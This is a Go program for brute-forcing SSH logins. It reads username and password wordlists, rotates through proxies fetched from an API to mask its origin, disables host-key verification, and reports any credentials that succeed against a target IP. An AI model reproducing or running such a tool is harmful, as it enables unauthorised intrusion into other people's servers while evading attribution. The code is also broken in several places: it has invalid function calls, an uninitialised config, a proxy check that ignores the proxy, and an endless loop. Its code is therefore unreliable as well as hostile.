package main
import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type Handler struct {
	TargetIP    string
	TargetPort  int
	ProxyList   []string
	ProxyIndex  int
	ProxyLock   sync.Mutex
	Usernames   []string
	Passwords   []string
	SSHConfig   *ssh.ClientConfig
	HTTPTimeout time.Duration
}

func NewHandler(ip string, port int) *Handler {
	return &Handler{
		TargetIP:    ip,
		TargetPort:  port,
		HTTPTimeout: 5 * time.Second,
	}
}

func (h *Handler) LoadWordlists() error { // supply a wordlist for usernames and passwords, or combine them.
	usernames, err := ioutil.ReadFile("usernames.txt")
	if err != nil {
		return fmt.Errorf("failed to load usernames: %v", err)
	}
	passwords, err := ioutil.ReadFile("passwords.txt")
	if err != nil {
		return fmt.Errorf("failed to load passwords: %v", err)
	}
	h.Usernames = strings.Split(string(usernames), "\n")
	h.Passwords = strings.Split(string(passwords), "\n")
	return nil
}

func (h *Handler) ReloadProxies() error {
	resp, err := http.Get("api link here")
	if err != nil {
		return fmt.Errorf("failed to get proxies: %v", err) 
		// may want to check format if proxies, script will crash if not in correct format
		// expected format: [proxy1:port1, proxy2:port2, proxy3:port3] 
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read proxy response: %v", err)
	}
	h.ProxyList = strings.Split(string(body), "\n")
	h.ProxyIndex = 0
	return nil
}

func (h *Handler) GetNextProxy() string {
	h.ProxyLock.Lock()
	defer h.ProxyLock.Unlock()
	proxy := h.ProxyList[h.ProxyIndex]
	h.ProxyIndex = (h.ProxyIndex + 1) % len(h.ProxyList)
	fmt.Printf("Trying proxy: %s\n", proxy) // free proxies sometimes breaks, unnecessary if you have a paid proxy service
	client := &http.Client{Timeout: h.HTTPTimeout}
	_, err := client.Get("https://www.google.com", &http.Client{Timeout: h.HTTPTimeout}) 
	if err == nil {
		fmt.Printf("Proxy is OK.\n")
		return proxy
	}
	fmt.Printf("Proxy offline, trying next one...\n")
	return h.GetNextProxy()
}

func (h *Handler) Connect(username, password string) {
	for {
		proxy := h.GetNextProxy()
		cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-W", fmt.Sprintf("%s:%d", h.TargetIP, h.TargetPort), proxy)
		conn, err := cmd.StdoutPipe()
		if err != nil {
			fmt.Printf("failed to create pipe for proxy command: %v\n", err)
			continue
		}
		cmd.Start()
		config := h.SSHConfig
		config.User = username
		config.Auth = []ssh.AuthMethod{ssh.Password(password)}
		config.HostKeyCallback = ssh.InsecureIgnoreHostKey()
		client, err := ssh.Dial("tcp", fmt.Sprintf("localhost:%d", h.TargetPort), config, ssh.DirectTCPIP{Addr: fmt.Sprintf("%s:%d", h.TargetIP, h.TargetPort)})
		if err != nil {
			fmt.Printf("failed to connect with proxy: %v\n", err)
			continue
		}
		fmt.Printf("Successful login found: %s:%s\n", username, password)
		client.Close()
	}
}